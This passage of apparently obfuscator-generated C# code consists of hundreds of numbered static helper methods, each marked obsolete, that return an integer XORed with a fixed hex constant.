		return int_4 ^ 0x763E6952;
	}

	[Obsolete("Exclude")]
	public static int smethod_4135(int int_4)
	{
		return int_4 ^ 0x327BF21B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4136(int int_4)
	{
		return int_4 ^ 0x64146F96;
	}

	[Obsolete("Exclude")]
	public static int smethod_4137(int int_4)
	{
		return int_4 ^ 0x783F88C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4138(int int_4)
	{
		return int_4 ^ 0x46F788C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4139(int int_4)
	{
		return int_4 ^ 0x3AEC7F38;
	}

	[Obsolete("Exclude")]
	public static int smethod_4140(int int_4)
	{
		return int_4 ^ 0x6E313587;
	}

	[Obsolete("Exclude")]
	public static int smethod_4141(int int_4)
	{
		return int_4 ^ 0x19911D71;
	}

	[Obsolete("Exclude")]
	public static int smethod_4142(int int_4)
	{
		return int_4 ^ 0x40E0FB00;
	}

	[Obsolete("Exclude")]
	public static int smethod_4143(int int_4)
	{
		return int_4 ^ 0x42E25538;
	}

	[Obsolete("Exclude")]
	public static int smethod_4144(int int_4)
	{
		return int_4 ^ 0x7D0EBD13;
	}

	[Obsolete("Exclude")]
	public static int smethod_4145(int int_4)
	{
		return int_4 ^ 0x18A18DC5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4146(int int_4)
	{
		return int_4 ^ 0x388E6759;
	}

	[Obsolete("Exclude")]
	public static int smethod_4147(int int_4)
	{
		return int_4 ^ 0x4D7ED828;
	}

	[Obsolete("Exclude")]
	public static int smethod_4148(int int_4)
	{
		return int_4 ^ 0x7C656ADC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4149(int int_4)
	{
		return int_4 ^ 0x77088E96;
	}

	[Obsolete("Exclude")]
	public static int smethod_4150(int int_4)
	{
		return int_4 ^ 0xE1A4CDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4151(int int_4)
	{
		return int_4 ^ 0x7779CA86;
	}

	[Obsolete("Exclude")]
	public static int smethod_4152(int int_4)
	{
		return int_4 ^ 0x541B3233;
	}

	[Obsolete("Exclude")]
	public static int smethod_4153(int int_4)
	{
		return int_4 ^ 0x6784BA16;
	}

	[Obsolete("Exclude")]
	public static int smethod_4154(int int_4)
	{
		return int_4 ^ 0x32E9013B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4155(int int_4)
	{
		return int_4 ^ 0x3FEBD929;
	}

	[Obsolete("Exclude")]
	public static int smethod_4156(int int_4)
	{
		return int_4 ^ 0x51CE243A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4157(int int_4)
	{
		return int_4 ^ 0x16FFA7C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4158(int int_4)
	{
		return int_4 ^ 0x35F9D49C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4159(int int_4)
	{
		return int_4 ^ 0x3F0B7B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4160(int int_4)
	{
		return int_4 ^ 0x41480577;
	}

	[Obsolete("Exclude")]
	public static int smethod_4161(int int_4)
	{
		return int_4 ^ 0x31AFBC4E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4162(int int_4)
	{
		return int_4 ^ 0x76212413;
	}

	[Obsolete("Exclude")]
	public static int smethod_4163(int int_4)
	{
		return int_4 ^ 0x15511544;
	}

	[Obsolete("Exclude")]
	public static int smethod_4164(int int_4)
	{
		return int_4 ^ 0x5D9DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4165(int int_4)
	{
		return int_4 ^ 0x7A3CDB9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4166(int int_4)
	{
		return int_4 ^ 0x52F4F214;
	}

	[Obsolete("Exclude")]
	public static int smethod_4167(int int_4)
	{
		return int_4 ^ 0xE29C516;
	}

	[Obsolete("Exclude")]
	public static int smethod_4168(int int_4)
	{
		return int_4 ^ 0x86614A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4169(int int_4)
	{
		return int_4 ^ 0x2AFE8946;
	}

	[Obsolete("Exclude")]
	public static int smethod_4170(int int_4)
	{
		return int_4 ^ 0x6DC1A670;
	}

	[Obsolete("Exclude")]
	public static int smethod_4171(int int_4)
	{
		return int_4 ^ 0x6D75427A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4172(int int_4)
	{
		return int_4 ^ 0xE2B62DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4173(int int_4)
	{
		return int_4 ^ 0x790BA2F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4174(int int_4)
	{
		return int_4 ^ 0x44BB6E9F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4175(int int_4)
	{
		return int_4 ^ 0x3EBDFF4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4176(int int_4)
	{
		return int_4 ^ 0x3A576FAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4177(int int_4)
	{
		return int_4 ^ 0x47DE4DD0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4178(int int_4)
	{
		return int_4 ^ 0x7674E1F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4179(int int_4)
	{
		return int_4 ^ 0x22B58957;
	}

	[Obsolete("Exclude")]
	public static int smethod_4180(int int_4)
	{
		return int_4 ^ 0x7F5217BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4181(int int_4)
	{
		return int_4 ^ 0x5A637210;
	}

	[Obsolete("Exclude")]
	public static int smethod_4182(int int_4)
	{
		return int_4 ^ 0x5B7722D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4183(int int_4)
	{
		return int_4 ^ 0x4630920D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4184(int int_4)
	{
		return int_4 ^ 0x5AEE8B1B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4185(int int_4)
	{
		return int_4 ^ 0x7AA639DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4186(int int_4)
	{
		return int_4 ^ 0x3DEB04B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4187(int int_4)
	{
		return int_4 ^ 0x3A2090CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4188(int int_4)
	{
		return int_4 ^ 0x6CD31AC4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4189(int int_4)
	{
		return int_4 ^ 0x54EC76D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4190(int int_4)
	{
		return int_4 ^ 0x39EE2F6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4191(int int_4)
	{
		return int_4 ^ 0x52388B82;
	}

	[Obsolete("Exclude")]
	public static int smethod_4192(int int_4)
	{
		return int_4 ^ 0x7AD192F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4193(int int_4)
	{
		return int_4 ^ 0x5D3E9D03;
	}

	[Obsolete("Exclude")]
	public static int smethod_4194(int int_4)
	{
		return int_4 ^ 0x582134B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4195(int int_4)
	{
		return int_4 ^ 0x4E428088;
	}

	[Obsolete("Exclude")]
	public static int smethod_4196(int int_4)
	{
		return int_4 ^ 0x1DD60488;
	}

	[Obsolete("Exclude")]
	public static int smethod_4197(int int_4)
	{
		return int_4 ^ 0x3918A546;
	}

	[Obsolete("Exclude")]
	public static int smethod_4198(int int_4)
	{
		return int_4 ^ 0x47F4495E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4199(int int_4)
	{
		return int_4 ^ 0x10C0B5F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4200(int int_4)
	{
		return int_4 ^ 0x6E1650D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4201(int int_4)
	{
		return int_4 ^ 0x600BD9BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4202(int int_4)
	{
		return int_4 ^ 0x780E2E5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4203(int int_4)
	{
		return int_4 ^ 0x5C2ED278;
	}

	[Obsolete("Exclude")]
	public static int smethod_4204(int int_4)
	{
		return int_4 ^ 0x2BF216F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4205(int int_4)
	{
		return int_4 ^ 0x226FCB84;
	}

	[Obsolete("Exclude")]
	public static int smethod_4206(int int_4)
	{
		return int_4 ^ 0x39A7E822;
	}

	[Obsolete("Exclude")]
	public static int smethod_4207(int int_4)
	{
		return int_4 ^ 0x1F8397;
	}

	[Obsolete("Exclude")]
	public static int smethod_4208(int int_4)
	{
		return int_4 ^ 0x794E50C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4209(int int_4)
	{
		return int_4 ^ 0x6B3AB9A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4210(int int_4)
	{
		return int_4 ^ 0x472FF1DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4211(int int_4)
	{
		return int_4 ^ 0x4EB1CDC5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4212(int int_4)
	{
		return int_4 ^ 0x41AE297A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4213(int int_4)
	{
		return int_4 ^ 0x4E34C741;
	}

	[Obsolete("Exclude")]
	public static int smethod_4214(int int_4)
	{
		return int_4 ^ 0x4E41DAED;
	}

	[Obsolete("Exclude")]
	public static int smethod_4215(int int_4)
	{
		return int_4 ^ 0x78D7CB8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4216(int int_4)
	{
		return int_4 ^ 0x4898324D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4217(int int_4)
	{
		return int_4 ^ 0x53E2F5B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4218(int int_4)
	{
		return int_4 ^ 0x3218CB5D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4219(int int_4)
	{
		return int_4 ^ 0x7E31E009;
	}

	[Obsolete("Exclude")]
	public static int smethod_4220(int int_4)
	{
		return int_4 ^ 0x737BAEDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4221(int int_4)
	{
		return int_4 ^ 0x5C4E4E2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4222(int int_4)
	{
		return int_4 ^ 0x2642AE19;
	}

	[Obsolete("Exclude")]
	public static int smethod_4223(int int_4)
	{
		return int_4 ^ 0x5B8D64D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4224(int int_4)
	{
		return int_4 ^ 0x1564863B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4225(int int_4)
	{
		return int_4 ^ 0x1800B9EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4226(int int_4)
	{
		return int_4 ^ 0x2FD18BA9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4227(int int_4)
	{
		return int_4 ^ 0x4145D662;
	}

	[Obsolete("Exclude")]
	public static int smethod_4228(int int_4)
	{
		return int_4 ^ 0x49E370FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4229(int int_4)
	{
		return int_4 ^ 0x30F1099B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4230(int int_4)
	{
		return int_4 ^ 0x451FB07E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4231(int int_4)
	{
		return int_4 ^ 0x176C4937;
	}

	[Obsolete("Exclude")]
	public static int smethod_4233(int int_4)
	{
		return int_4 ^ 0x7275DF23;
	}

	[Obsolete("Exclude")]
	public static int smethod_4234(int int_4)
	{
		return int_4 ^ 0x5F46EC56;
	}

	[Obsolete("Exclude")]
	public static int smethod_4235(int int_4)
	{
		return int_4 ^ 0x6FBB1EDB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4236(int int_4)
	{
		return int_4 ^ 0x7068D64D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4237(int int_4)
	{
		return int_4 ^ 0x2BB412EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4238(int int_4)
	{
		return int_4 ^ 0x59DEAD15;
	}

	[Obsolete("Exclude")]
	public static int smethod_4239(int int_4)
	{
		return int_4 ^ 0x73989F22;
	}

	[Obsolete("Exclude")]
	public static int smethod_4240(int int_4)
	{
		return int_4 ^ 0x4552D530;
	}

	[Obsolete("Exclude")]
	public static int smethod_4241(int int_4)
	{
		return int_4 ^ 0x68676CA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4242(int int_4)
	{
		return int_4 ^ 0x4937814E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4243(int int_4)
	{
		return int_4 ^ 0x6A4A092;
	}

	[Obsolete("Exclude")]
	public static int smethod_4244(int int_4)
	{
		return int_4 ^ 0x7F31B9FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4245(int int_4)
	{
		return int_4 ^ 0x1C59E66A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4246(int int_4)
	{
		return int_4 ^ 0x704D9EE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4247(int int_4)
	{
		return int_4 ^ 0x568AC9D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4248(int int_4)
	{
		return int_4 ^ 0x3D0F9CF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4249(int int_4)
	{
		return int_4 ^ 0x55517CF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4250(int int_4)
	{
		return int_4 ^ 0x2C54044F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4251(int int_4)
	{
		return int_4 ^ 0x20D0698B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4252(int int_4)
	{
		return int_4 ^ 0x4CDD0EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4253(int int_4)
	{
		return int_4 ^ 0x7133370B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4254(int int_4)
	{
		return int_4 ^ 0x747C196A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4255(int int_4)
	{
		return int_4 ^ 0x261DEEEE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4256(int int_4)
	{
		return int_4 ^ 0x3D36AEF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4257(int int_4)
	{
		return int_4 ^ 0x6337869C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4258(int int_4)
	{
		return int_4 ^ 0x46B4CA49;
	}

	[Obsolete("Exclude")]
	public static int smethod_4259(int int_4)
	{
		return int_4 ^ 0x60A71C54;
	}

	[Obsolete("Exclude")]
	public static int smethod_4260(int int_4)
	{
		return int_4 ^ 0x3413A6A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4261(int int_4)
	{
		return int_4 ^ 0x366E7A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4262(int int_4)
	{
		return int_4 ^ 0x7C97CE92;
	}

	[Obsolete("Exclude")]
	public static int smethod_4263(int int_4)
	{
		return int_4 ^ 0x52C08916;
	}

	[Obsolete("Exclude")]
	public static int smethod_4264(int int_4)
	{
		return int_4 ^ 0x2E28A9F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4265(int int_4)
	{
		return int_4 ^ 0x24A735DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4266(int int_4)
	{
		return int_4 ^ 0x526CADE0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4267(int int_4)
	{
		return int_4 ^ 0x7EDAEA30;
	}

	[Obsolete("Exclude")]
	public static int smethod_4268(int int_4)
	{
		return int_4 ^ 0x15166ADC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4269(int int_4)
	{
		return int_4 ^ 0x56F6735B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4270(int int_4)
	{
		return int_4 ^ 0x6E9E1665;
	}

	[Obsolete("Exclude")]
	public static int smethod_4271(int int_4)
	{
		return int_4 ^ 0x50408DC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4272(int int_4)
	{
		return int_4 ^ 0x79745567;
	}

	[Obsolete("Exclude")]
	public static int smethod_4273(int int_4)
	{
		return int_4 ^ 0x131AB7A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4274(int int_4)
	{
		return int_4 ^ 0x3B4FB02C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4275(int int_4)
	{
		return int_4 ^ 0x635EC8AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4276(int int_4)
	{
		return int_4 ^ 0x583FC493;
	}

	[Obsolete("Exclude")]
	public static int smethod_4277(int int_4)
	{
		return int_4 ^ 0x15FE8412;
	}

	[Obsolete("Exclude")]
	public static int smethod_4278(int int_4)
	{
		return int_4 ^ 0x7EA2F5AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4279(int int_4)
	{
		return int_4 ^ 0x6C26D833;
	}

	[Obsolete("Exclude")]
	public static int smethod_4280(int int_4)
	{
		return int_4 ^ 0x31735B92;
	}

	[Obsolete("Exclude")]
	public static int smethod_4281(int int_4)
	{
		return int_4 ^ 0x199CC91E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4282(int int_4)
	{
		return int_4 ^ 0x57DF476F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4283(int int_4)
	{
		return int_4 ^ 0x7574BD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4284(int int_4)
	{
		return int_4 ^ 0x6B30D6AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4285(int int_4)
	{
		return int_4 ^ 0x436D23A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4286(int int_4)
	{
		return int_4 ^ 0x38375FF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4287(int int_4)
	{
		return int_4 ^ 0x6ABAAE24;
	}

	[Obsolete("Exclude")]
	public static int smethod_4288(int int_4)
	{
		return int_4 ^ 0x6536C18A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4289(int int_4)
	{
		return int_4 ^ 0x10149D7B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4290(int int_4)
	{
		return int_4 ^ 0x371767AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4291(int int_4)
	{
		return int_4 ^ 0x4C6A9F59;
	}

	[Obsolete("Exclude")]
	public static int smethod_4292(int int_4)
	{
		return int_4 ^ 0x1536A78;
	}

	[Obsolete("Exclude")]
	public static int smethod_4293(int int_4)
	{
		return int_4 ^ 0x7A929466;
	}

	[Obsolete("Exclude")]
	public static int smethod_4294(int int_4)
	{
		return int_4 ^ 0x7BD7C4D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4295(int int_4)
	{
		return int_4 ^ 0x5854DD3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4296(int int_4)
	{
		return int_4 ^ 0x3FFE8EC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4297(int int_4)
	{
		return int_4 ^ 0x3F0442E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4298(int int_4)
	{
		return int_4 ^ 0x1631557C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4299(int int_4)
	{
		return int_4 ^ 0x52A6C4EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4300(int int_4)
	{
		return int_4 ^ 0x5C671F04;
	}

	[Obsolete("Exclude")]
	public static int smethod_4301(int int_4)
	{
		return int_4 ^ 0x1D353534;
	}

	[Obsolete("Exclude")]
	public static int smethod_4302(int int_4)
	{
		return int_4 ^ 0x4457F8DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4303(int int_4)
	{
		return int_4 ^ 0xF852432;
	}

	[Obsolete("Exclude")]
	public static int smethod_4304(int int_4)
	{
		return int_4 ^ 0x384D2A3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4305(int int_4)
	{
		return int_4 ^ 0xC1EDA39;
	}

	[Obsolete("Exclude")]
	public static int smethod_4306(int int_4)
	{
		return int_4 ^ 0x61B396DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4307(int int_4)
	{
		return int_4 ^ 0x7C060FDB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4308(int int_4)
	{
		return int_4 ^ 0x7EF9EBD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4309(int int_4)
	{
		return int_4 ^ 0x6A671E7B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4310(int int_4)
	{
		return int_4 ^ 0x65B2D90E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4311(int int_4)
	{
		return int_4 ^ 0x4B987D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4312(int int_4)
	{
		return int_4 ^ 0xB68C4C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4313(int int_4)
	{
		return int_4 ^ 0x7C250F4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4314(int int_4)
	{
		return int_4 ^ 0x67356D51;
	}

	[Obsolete("Exclude")]
	public static int smethod_4315(int int_4)
	{
		return int_4 ^ 0x61FC178E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4316(int int_4)
	{
		return int_4 ^ 0x1E54A4B7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4317(int int_4)
	{
		return int_4 ^ 0x568C9ED9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4318(int int_4)
	{
		return int_4 ^ 0xDF37434;
	}

	[Obsolete("Exclude")]
	public static int smethod_4319(int int_4)
	{
		return int_4 ^ 0x32569754;
	}

	[Obsolete("Exclude")]
	public static int smethod_4320(int int_4)
	{
		return int_4 ^ 0x2BDBE968;
	}

	[Obsolete("Exclude")]
	public static int smethod_4321(int int_4)
	{
		return int_4 ^ 0x1E0040E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4322(int int_4)
	{
		return int_4 ^ 0x6BFDD64C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4323(int int_4)
	{
		return int_4 ^ 0x3AC9D8F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4324(int int_4)
	{
		return int_4 ^ 0x3B9637B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4325(int int_4)
	{
		return int_4 ^ 0x49B83533;
	}

	[Obsolete("Exclude")]
	public static int smethod_4326(int int_4)
	{
		return int_4 ^ 0x45043B3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4327(int int_4)
	{
		return int_4 ^ 0x58B171BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4328(int int_4)
	{
		return int_4 ^ 0x349A6FB8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4329(int int_4)
	{
		return int_4 ^ 0x356FE7F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4330(int int_4)
	{
		return int_4 ^ 0xA1C5C77;
	}

	[Obsolete("Exclude")]
	public static int smethod_4331(int int_4)
	{
		return int_4 ^ 0x24C1DEE9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4332(int int_4)
	{
		return int_4 ^ 0x3D882F2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4333(int int_4)
	{
		return int_4 ^ 0x5F006CDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4334(int int_4)
	{
		return int_4 ^ 0x442729EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4335(int int_4)
	{
		return int_4 ^ 0x47D7B612;
	}

	[Obsolete("Exclude")]
	public static int smethod_4336(int int_4)
	{
		return int_4 ^ 0x50F636C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4337(int int_4)
	{
		return int_4 ^ 0x6D304C39;
	}

	[Obsolete("Exclude")]
	public static int smethod_4338(int int_4)
	{
		return int_4 ^ 0x25610959;
	}

	[Obsolete("Exclude")]
	public static int smethod_4339(int int_4)
	{
		return int_4 ^ 0x4F7D5C52;
	}

	[Obsolete("Exclude")]
	public static int smethod_4340(int int_4)
	{
		return int_4 ^ 0x2090C14F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4341(int int_4)
	{
		return int_4 ^ 0x2A321700;
	}

	[Obsolete("Exclude")]
	public static int smethod_4342(int int_4)
	{
		return int_4 ^ 0x42AE27A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4343(int int_4)
	{
		return int_4 ^ 0x4B886CBA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4344(int int_4)
	{
		return int_4 ^ 0x615A6C15;
	}

	[Obsolete("Exclude")]
	public static int smethod_4345(int int_4)
	{
		return int_4 ^ 0x27640138;
	}

	[Obsolete("Exclude")]
	public static int smethod_4346(int int_4)
	{
		return int_4 ^ 0x7CF22093;
	}

	[Obsolete("Exclude")]
	public static int smethod_4347(int int_4)
	{
		return int_4 ^ 0x695FC7C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4348(int int_4)
	{
		return int_4 ^ 0x5091C4C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4349(int int_4)
	{
		return int_4 ^ 0x1CBBBEDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4350(int int_4)
	{
		return int_4 ^ 0x2A23474A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4351(int int_4)
	{
		return int_4 ^ 0x11F5CFE0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4352(int int_4)
	{
		return int_4 ^ 0x19295279;
	}

	[Obsolete("Exclude")]
	public static int smethod_4353(int int_4)
	{
		return int_4 ^ 0x72E3918D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4354(int int_4)
	{
		return int_4 ^ 0xDDB83CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4355(int int_4)
	{
		return int_4 ^ 0x5F5785E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4356(int int_4)
	{
		return int_4 ^ 0x32C75ADE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4357(int int_4)
	{
		return int_4 ^ 0x63E3C279;
	}

	[Obsolete("Exclude")]
	public static int smethod_4358(int int_4)
	{
		return int_4 ^ 0x19D80163;
	}

	[Obsolete("Exclude")]
	public static int smethod_4359(int int_4)
	{
		return int_4 ^ 0x1C97A83E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4360(int int_4)
	{
		return int_4 ^ 0x3748C7EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4361(int int_4)
	{
		return int_4 ^ 0x62548875;
	}

	[Obsolete("Exclude")]
	public static int smethod_4362(int int_4)
	{
		return int_4 ^ 0x49D1C192;
	}

	[Obsolete("Exclude")]
	public static int smethod_4363(int int_4)
	{
		return int_4 ^ 0x18BFD297;
	}

	[Obsolete("Exclude")]
	public static int smethod_4364(int int_4)
	{
		return int_4 ^ 0xEFE317E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4365(int int_4)
	{
		return int_4 ^ 0x5E1A6800;
	}

	[Obsolete("Exclude")]
	public static int smethod_4366(int int_4)
	{
		return int_4 ^ 0x7DA95098;
	}

	[Obsolete("Exclude")]
	public static int smethod_4367(int int_4)
	{
		return int_4 ^ 0x6F0BE77A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4368(int int_4)
	{
		return int_4 ^ 0x45097582;
	}

	[Obsolete("Exclude")]
	public static int smethod_4369(int int_4)
	{
		return int_4 ^ 0x3B1745E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4370(int int_4)
	{
		return int_4 ^ 0x36A04EF4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4371(int int_4)
	{
		return int_4 ^ 0x1E83BF7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4372(int int_4)
	{
		return int_4 ^ 0x180CF461;
	}

	[Obsolete("Exclude")]
	public static int smethod_4373(int int_4)
	{
		return int_4 ^ 0x4D8306E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4374(int int_4)
	{
		return int_4 ^ 0x54A193A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4375(int int_4)
	{
		return int_4 ^ 0x22625B7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4376(int int_4)
	{
		return int_4 ^ 0x5871ACE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4377(int int_4)
	{
		return int_4 ^ 0x282A3E03;
	}

	[Obsolete("Exclude")]
	public static int smethod_4378(int int_4)
	{
		return int_4 ^ 0x75E458C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4379(int int_4)
	{
		return int_4 ^ 0x68EE5E2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4380(int int_4)
	{
		return int_4 ^ 0x5E2868FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4381(int int_4)
	{
		return int_4 ^ 0x7DE8B017;
	}

	[Obsolete("Exclude")]
	public static int smethod_4382(int int_4)
	{
		return int_4 ^ 0xA6696AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_4383(int int_4)
	{
		return int_4 ^ 0x586900A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4384(int int_4)
	{
		return int_4 ^ 0x7FB69126;
	}

	[Obsolete("Exclude")]
	public static int smethod_4385(int int_4)
	{
		return int_4 ^ 0x71198AEB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4386(int int_4)
	{
		return int_4 ^ 0x2B93E060;
	}

	[Obsolete("Exclude")]
	public static int smethod_4387(int int_4)
	{
		return int_4 ^ 0x6F7A1305;
	}

	[Obsolete("Exclude")]
	public static int smethod_4388(int int_4)
	{
		return int_4 ^ 0x42AC3065;
	}

	[Obsolete("Exclude")]
	public static int smethod_4389(int int_4)
	{
		return int_4 ^ 0x70ED64D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4390(int int_4)
	{
		return int_4 ^ 0x29D3EEA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4391(int int_4)
	{
		return int_4 ^ 0x325EB62C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4392(int int_4)
	{
		return int_4 ^ 0x3522B578;
	}

	[Obsolete("Exclude")]
	public static int smethod_4393(int int_4)
	{
		return int_4 ^ 0x75267496;
	}

	[Obsolete("Exclude")]
	public static int smethod_4394(int int_4)
	{
		return int_4 ^ 0x11213470;
	}

	[Obsolete("Exclude")]
	public static int smethod_4395(int int_4)
	{
		return int_4 ^ 0x624C9DB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4396(int int_4)
	{
